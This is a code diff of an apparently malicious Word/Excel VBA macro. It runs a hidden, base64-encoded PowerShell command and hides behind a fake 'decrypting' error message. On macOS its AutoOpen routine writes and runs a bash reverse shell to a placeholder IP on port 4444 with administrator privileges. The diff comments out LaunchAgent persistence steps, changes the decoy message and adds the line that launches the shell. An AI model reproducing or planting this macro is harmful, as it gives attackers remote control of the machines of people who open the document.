@@ -23,10 +23,10 @@ x = "powershell -nop -win hidden -noni -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBb
 Shell ("POWERSHELL.EXE " & x)
 
 Dim title As String
-title = "Critical error"
+title = "Document error"
 Dim msg As String
 Dim intResponse As Integer
-msg = "An error has occurd while decrypting the file. Excel is unable to continue."
+msg = "An error has occurd while decrypting the file. Word is unable to continue."
 intResponse = MsgBox(msg, 16, title)
 Application.Quit
 End Sub
@@ -42,18 +42,20 @@ Sub AutoOpen()
 
         MacScript "do shell script ""cat <<EOF > $HOME/.hidden/connect.sh\n#!/bin/bash\nbash -i >& /dev/tcp/<Reverse Shell IP Here>/4444 0>&1\nwait"""
     
-        MacScript "do shell script ""cat <<EOF > $HOME/.hidden/persist.sh\n#!/bin/bash\nmkdir -p /Library/LaunchDaemons\ncp $HOME/Library/LaunchAgents/com.apple.video2.plist /Library/LaunchDaemons/com.apple.video2.plist\nlaunchctl load /Library/LaunchDaemons/com.apple.video2.plist"""
+        'MacScript "do shell script ""cat <<EOF > $HOME/.hidden/persist.sh\n#!/bin/bash\nmkdir -p /Library/LaunchDaemons\ncp $HOME/Library/LaunchAgents/com.apple.video2.plist /Library/LaunchDaemons/com.apple.video2.plist\nlaunchctl load /Library/LaunchDaemons/com.apple.video2.plist"""
 
-        MacScript "do shell script ""chmod +x $HOME/.hidden/connect.sh"""
+        'MacScript "do shell script ""chmod +x $HOME/.hidden/connect.sh"""
     
-        MacScript "do shell script ""mkdir -p $HOME/Library/LaunchAgents"""
+        'MacScript "do shell script ""mkdir -p $HOME/Library/LaunchAgents"""
 
-        MacScript "do shell script ""cat <<EOF > $HOME/Library/LaunchAgents/com.apple.video2.plist\n<plist version=“1.0”>\n    <dict>\n    <key>Label</key>\n        <string>com.apple.video2</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/bin/sh</string>\n        <string>$HOME/.hidden/connect.sh</string>\n    </array>\n    <key>RunAtLoad</key>\n        <true/>\n    <key>StartInterval</key>\n        <integer>120</integer>\n    <key>AbandonProcessGroup</key>\n        <true/>\n    </dict>\n</plist>"""
+        'MacScript "do shell script ""cat <<EOF > $HOME/Library/LaunchAgents/com.apple.video2.plist\n<plist version=“1.0”>\n    <dict>\n    <key>Label</key>\n        <string>com.apple.video2</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/bin/sh</string>\n        <string>$HOME/.hidden/connect.sh</string>\n    </array>\n    <key>RunAtLoad</key>\n        <true/>\n    <key>StartInterval</key>\n        <integer>120</integer>\n    <key>AbandonProcessGroup</key>\n        <true/>\n    </dict>\n</plist>"""
     
-        MacScript "do shell script ""launchctl load $HOME/Library/LaunchAgents/com.apple.video2.plist"""
+        'MacScript "do shell script ""launchctl load $HOME/Library/LaunchAgents/com.apple.video2.plist"""
     
-        MacScript "do shell script ""sh $HOME/.hidden/persist.sh"" with administrator privileges"
-    
+        'MacScript "do shell script ""sh $HOME/.hidden/persist.sh"" with administrator privileges"
+        
+        MacScript "do shell script ""sh $HOME/.hidden/connect.sh"" with administrator privileges"
+        
         #End If
         #End If
 End Sub
